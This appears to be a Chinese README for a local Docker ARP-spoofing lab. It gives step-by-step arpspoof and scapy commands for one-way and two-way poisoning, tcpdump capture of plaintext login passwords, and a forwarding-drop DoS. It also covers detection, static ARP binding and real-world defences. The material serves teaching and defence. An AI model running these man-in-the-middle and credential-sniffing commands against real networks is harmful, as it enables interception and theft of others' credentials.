# ARP 欺骗靶场

本地 Docker 环境练 ARP 欺骗：从「为什么骗不动」开始，到完整中间人、抓明文密码、检测、防御。

> 协议原理（报文结构、缓存状态机）和两个脚本的逐层拆解，见 [`PRINCIPLE.md`](PRINCIPLE.md)。这份 README 只讲怎么动手。

> 只在你自己控制的本地环境里用。这套容器和宿主机网络隔离，出不了你电脑。

## 拓扑

```
                     arpnet 172.28.0.0/24（同一个 bridge，二层互通）

  attacker 172.28.0.4 ──┐
                        │
  victim   172.28.0.3 ──┼── gateway 172.28.0.2
                        │      └─ 跑 server.py，扮演上游网站
```

- `victim` 的默认路由指向 `172.28.0.2`，它访问网站时以为在跟网关说话
- 被毒化后，victim 的发包先到 `attacker`，由攻击机转发（或丢掉）
- 三个容器都带 `NET_ADMIN` + `NET_RAW`，攻击机额外开了 `net.ipv4.ip_forward=1`

## 起环境

```bash
cd /Users/liyuhang/代码库/靶场/arp
./run.sh
```

脚本会打印三个容器的真实 MAC。**下面所有命令都从容器里读 MAC，不要抄死值**，重建容器后 MAC 会变。

停环境：`docker compose down`　　重置：`docker compose restart`

## 实验 1：先看正常状态

```bash
docker exec arp-victim ip route          # default via 172.28.0.2
docker exec arp-victim ping -c2 172.28.0.2
docker exec arp-victim ip neigh          # 172.28.0.2 -> 真网关 MAC，REACHABLE
docker exec arp-victim curl -s http://172.28.0.2/
```

这一步是基线。后面所有「变化」都要跟这里对比，否则你没法判断到底有没有骗成功。

## 实验 2：为什么 arpspoof 跑了却没反应（第一个大坑）

先记下真网关 MAC：

```bash
GW_MAC=$(docker exec arp-gw cat /sys/class/net/eth0/address)
echo $GW_MAC
```

然后直接毒化：

```bash
docker exec -d arp-attacker arpspoof -i eth0 -t 172.28.0.3 172.28.0.2
sleep 4
docker exec arp-victim ip neigh show 172.28.0.2
```

**大概率还是原来的 MAC，状态 `REACHABLE`。** arpspoof 明明在发包，怎么没效果？

原因：现代 Linux 内核收到「非请求的 ARP 应答」时，如果邻居条目正处在 `REACHABLE`，会倾向于忽略它——防止随便一个包就能改写缓存。只有条目老化成 `STALE` 之后，新信息才会被接受。

这就解释了为什么真实的 ARP 攻击要**一直发**，不是发一次就完事：它在等条目老化的那个窗口。开着 arpspoof 等久一点（十几秒到几十秒，取决于内核参数和有没有别的流量），条目自己会从 `REACHABLE` 转成 `STALE`，那一刻毒化就生效了。

想立刻复现，把条目手动改成 `STALE` 就行：

```bash
docker exec arp-victim ip neigh change 172.28.0.2 dev eth0 nud stale
docker exec arp-victim ip neigh show 172.28.0.2      # 现在是 STALE
sleep 5                                              # 等 arpspoof 下一轮
docker exec arp-victim ip neigh show 172.28.0.2      # 变成攻击机 MAC 了
```

`ip neigh` 最后一列的含义值得记一下：

- `REACHABLE` 最近确认过可达，短期内不会再去问
- `STALE` 条目还有效，但下次发包前要先重新确认（**这就是攻击窗口**）
- `DELAY` / `PROBE` 正在确认中
- `PERMANENT` 手动钉死的，永远不老化（防御用）

## 实验 3：单向毒化只能看到上行

只骗受害者（`-t 受害者 要冒充的IP`），网关那一侧不动：

```bash
docker exec arp-attacker pkill -f arpspoof 2>/dev/null
# 先把网关侧的残留毒化清掉，否则上一轮双向毒化的效果还在，下行照样经过攻击机
docker exec arp-gw ip neigh del 172.28.0.3 dev eth0 2>/dev/null
docker exec arp-gw ping -c1 172.28.0.3 >/dev/null 2>&1

docker exec arp-victim ip neigh change 172.28.0.2 dev eth0 nud stale
docker exec -d arp-attacker sh -c "arpspoof -i eth0 -t 172.28.0.3 172.28.0.2 > /tmp/a.log 2>&1"
sleep 5
docker exec arp-victim ip neigh show 172.28.0.2   # 已指向攻击机
```

现在攻击机抓包，然后让受害者登录：

```bash
docker exec -d arp-attacker sh -c "tcpdump -l -i eth0 -s0 -A 'host 172.28.0.3 and tcp port 80' > /tmp/up.log 2>&1"
sleep 2
docker exec arp-victim curl -s -X POST -d "user=admin&pass=OneWay" http://172.28.0.2/login
sleep 2
docker exec arp-attacker grep -a "OneWay" /tmp/up.log | head -3
```

能看到密码——因为请求包被引到了攻击机。但**响应看不到**，因为网关回包时直接按自己的 ARP 缓存发给受害者，不经过攻击机。

所以单向毒化适合「我只想偷看请求」，比如抓 HTTP 明文凭据、抓 Cookie。要看完整会话就得双向。

## 实验 4：双向毒化 + 转发 = 完整中间人

用自带的 scapy 脚本，两个方向都骗，退出时自动恢复：

```bash
docker exec arp-attacker pkill -f arpspoof 2>/dev/null
docker exec -d arp-attacker sh -c "python3 /lab/arpspoof.py > /tmp/spoof.log 2>&1"
sleep 5
docker exec arp-attacker cat /tmp/spoof.log
docker exec arp-victim ip neigh show 172.28.0.2
docker exec arp-gw     ip neigh show 172.28.0.3    # 网关这边也被骗了
```

两边都指向攻击机，这才叫双向。现在攻击机是真正的中间人：

```bash
docker exec -d arp-attacker sh -c "tcpdump -l -i eth0 -s0 -A 'host 172.28.0.3 and tcp port 80' > /tmp/mitm.log 2>&1"
sleep 2
docker exec arp-victim curl -s -X POST -d "user=admin&pass=Sup3rS3cret!" http://172.28.0.2/login
sleep 2
echo "--- 攻击机看到的 ---"
docker exec arp-attacker grep -a -E "POST|Sup3rS3cret" /tmp/mitm.log | head -4
echo "--- 网关那边也收到了（说明包被转发，不是断网） ---"
docker logs arp-gw 2>&1 | tail -3
```

两个输出都要有：攻击机拿到明文密码，网关也正常收到请求。**只有两边都有，才证明是中间人而不是断网。**

### 关掉转发就是断网 DoS

```bash
docker exec arp-attacker iptables -A FORWARD -j DROP        # 模拟不转发
docker exec arp-victim curl -s -m 5 -o /dev/null -w "状态: %{http_code}\n" http://172.28.0.2/
# 000 = 超时，流量被引到攻击机然后被丢掉
docker exec arp-attacker iptables -D FORWARD -j DROP
```

## 实验 5：检测

在受害者上跑检测脚本：

```bash
docker exec arp-attacker pkill -f arpspoof 2>/dev/null; sleep 1
docker exec arp-victim ip neigh del 172.28.0.2 dev eth0 2>/dev/null
docker exec arp-victim ping -c1 172.28.0.2 >/dev/null 2>&1

docker exec -d arp-victim sh -c "python3 /lab/detect_arp_spoof.py > /tmp/detect.log 2>&1"
sleep 3
docker exec arp-victim cat /tmp/detect.log                 # 打印基线

docker exec arp-victim ip neigh change 172.28.0.2 dev eth0 nud stale
docker exec -d arp-attacker sh -c "python3 /lab/arpspoof.py > /tmp/spoof.log 2>&1"
sleep 5
docker exec arp-victim cat /tmp/detect.log                 # 告警
```

输出类似：

```
[!] 01:17:30 ARP 欺骗告警：172.28.0.2 声称 MAC 是 b2:c9:9e:24:66:9c，但基线是 22:0e:42:13:ca:93
    来源帧：src MAC=b2:c9:9e:24:66:9c  ->  如果你没换网卡，这就是攻击者
```

**为什么检测要放在受害者上**：攻击机发的是单播 ARP 应答（`Ether.dst` 直接写受害者 MAC），同网段的第三台机器在真实交换机上收不到这些帧。所以传统的旁路 arpwatch 在这种场景里是瞎的，只有被骗的主机自己看得见谎言。

这套逻辑的局限也得知道：网关真换了网卡、做了 VRRP 主备切换，同样会告警；攻击者把 MAC 伪造成和真网关一模一样，检测不到。

## 实验 6：静态 ARP 绑定（防御）

钉死网关的 MAC：

```bash
GW_MAC=$(docker exec arp-gw cat /sys/class/net/eth0/address)
docker exec arp-victim ip neigh replace 172.28.0.2 dev eth0 lladdr $GW_MAC nud permanent
docker exec arp-victim ip neigh show 172.28.0.2    # 末尾 PERMANENT
```

再毒化，看还能不能骗动：

```bash
docker exec -d arp-attacker sh -c "python3 /lab/arpspoof.py > /tmp/spoof.log 2>&1"
sleep 6
docker exec arp-victim ip neigh show 172.28.0.2    # 还是真 MAC，PERMANENT
```

### 别用「抓包能不能看到」判断防御是否有效

这一步很容易踩坑：静态绑定之后，攻击机可能**还是能抓到一些包**。原因通常不是防御失效，而是网关那一侧的 ARP 缓存还残留着攻击机 MAC（上一轮双向毒化的结果），回包依然先到攻击机。

更硬的判据是**把攻击机的转发掐掉，看受害者还能不能通**：

```bash
# 双侧都钉死
docker exec arp-gw ip neigh replace 172.28.0.3 dev eth0 lladdr $(docker exec arp-victim cat /sys/class/net/eth0/address) nud permanent
docker exec arp-victim ip neigh replace 172.28.0.2 dev eth0 lladdr $GW_MAC nud permanent

docker exec arp-attacker iptables -A FORWARD -j DROP
docker exec arp-victim curl -s -m 5 -o /dev/null -w "状态: %{http_code}\n" http://172.28.0.2/
# 200 = 流量压根没经过攻击机，防御有效
docker exec arp-attacker iptables -D FORWARD -j DROP
```

对比实验 4 的同一个操作（毒化状态下 DROP → 000），结论就明确了。

## 实验 7：现成工具

dsniff 的 `arpspoof`，一条命令，单向：

```bash
docker exec arp-victim ip neigh change 172.28.0.2 dev eth0 nud stale
docker exec -d arp-attacker sh -c "arpspoof -i eth0 -t 172.28.0.3 172.28.0.2 > /tmp/dsniff.log 2>&1"
sleep 4
docker exec arp-attacker head -2 /tmp/dsniff.log
```

输出直接就是帧结构，可以对着 `arpspoof.py` 里的注释看：

```
9a:d1:97:78:48:6a da:c6:fc:38:b5:00 0806 42: arp reply 172.28.0.2 is-at 9a:d1:97:78:48:6a
└─ 源 MAC ────────┘ └─ 目的 MAC ──────┘ └类型┘ └长度┘  这就是 op=2 的 is-at
```

双向要开两个进程（两个方向各一个）：

```bash
docker exec -d arp-attacker arpspoof -i eth0 -t 172.28.0.3 172.28.0.2   # 骗受害者
docker exec -d arp-attacker arpspoof -i eth0 -t 172.28.0.2 172.28.0.3   # 骗网关
```

`dsniff` 需要从 `/proc/net/arp` 查目标 MAC，如果攻击机的 ARP 表里没有目标条目，会发出目的 MAC 畸形的帧，受害者收不到、毒化静默失败。先 `ping` 一下目标就解决了。

想上更完整的框架可以自己装 `bettercap`（自带 `net.probe` / `arp.spoof` / 流量嗅探 / 面板），思路和上面完全一样，只是封装好了。

## 踩坑记录

- **`sysctl -w net.ipv4.ip_forward=1` 在容器里 permission denied**。这个参数必须在创建 netns 时定好，所以写进了 compose 的 `sysctls`。容器起来后再改是不行的。
- **恢复必须双向**。脚本退出时只恢复受害者、不恢复网关，网关会继续把回包发给攻击机，症状是「攻击停了但受害者还是不通」。
- **`ip neigh replace` 少写 `dev eth0` 会报 "Device and destination are required arguments"**。
- **稳定 `REACHABLE` 条目毒化不动**，先 `nud stale` 或等它老化，见实验 2。
- **`tcpdump` 输出重定向到文件时是块缓冲**，`sleep 2` 后去 `grep` 可能什么也搜不到，文件看着是空的。加 `-l`（行缓冲）就立刻能搜到。上面所有命令都带了 `-l`。
- **「抓到包」不等于「攻击成功」**。判断成功的顺序是：先看两侧 ARP 表变了没有，再看流量是否真的经过攻击机（用 `iptables -A FORWARD -j DROP` 做反证）。只看 tcpdump 有输出很容易误判。
- **容器重建后 MAC 全变**，任何写死 MAC 的命令都会失效。

## 真实世界的防御手段

- **静态 ARP 绑定**：上面做的。小网络可控，大网络维护成本高。
- **动态 ARP 检测（DAI）**：交换机上配合 DHCP snooping 建立「IP-MAC-端口」绑定表，非法 ARP 直接丢弃。企业网的标准做法，需要可网管交换机。
- **端口隔离 / PVLAN**：让同网段主机之间根本不通，ARP 欺骗拿不到目标。
- **加密流量**：HTTPS / SSH 之后，就算被中间人也只能看到密文（但攻击者仍能做 SSL 剥离、DNS 劫持，别以为加密就万事大吉）。
- **终端侧检测**：arpwatch、EDR 的 ARP 异常告警，逻辑和 `detect_arp_spoof.py` 一样。

## 命令速查

```bash
# 看 ARP 表（带状态）
docker exec arp-victim ip neigh

# 清掉某条缓存，让下次通信重新解析
docker exec arp-victim ip neigh del 172.28.0.2 dev eth0

# 手动把条目改成 STALE（制造攻击窗口）
docker exec arp-victim ip neigh change 172.28.0.2 dev eth0 nud stale

# 钉死，永不老化
docker exec arp-victim ip neigh replace 172.28.0.2 dev eth0 lladdr <MAC> nud permanent

# 抓包看明文
docker exec arp-attacker tcpdump -l -i eth0 -s0 -A 'host 172.28.0.3 and tcp port 80'

# 看某个容器的 MAC
docker exec arp-gw cat /sys/class/net/eth0/address
```
